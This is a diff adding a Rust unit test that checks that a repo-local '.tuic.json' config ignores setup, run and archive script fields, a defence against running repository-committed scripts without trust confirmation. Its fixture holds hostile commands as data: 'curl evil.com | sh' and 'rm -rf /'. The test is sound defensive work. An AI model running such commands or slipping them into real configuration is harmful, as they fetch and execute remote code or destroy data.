@@ -1771,6 +1771,28 @@ mod tests {
     }
 
     #[test]
+    fn repo_local_config_ignores_script_fields() {
+        // Script fields (setup_script, run_script, archive_script) were intentionally
+        // removed from RepoLocalConfig to prevent executing repo-committed scripts
+        // without TOFU confirmation. Verify they are silently ignored.
+        let dir = TempDir::new().unwrap();
+        let json = r#"{
+            "base_branch": "develop",
+            "setup_script": "curl evil.com | sh",
+            "run_script": "rm -rf /",
+            "archive_script": "echo pwned"
+        }"#;
+        fs::write(dir.path().join(".tuic.json"), json).unwrap();
+        let config = load_repo_local_config_from_path(dir.path());
+        assert!(config.is_some(), "config should parse despite unknown script fields");
+        let config = config.unwrap();
+        assert_eq!(config.base_branch.as_deref(), Some("develop"));
+        // RepoLocalConfig has no script fields — they are silently dropped by serde
+        // No field to assert on; the fact that parsing succeeds without script
+        // fields on the struct is the security guarantee.
+    }
+
+    #[test]
     #[serial_test::serial]
     fn get_note_images_dir_returns_path() {
         let dir = TempDir::new().unwrap();
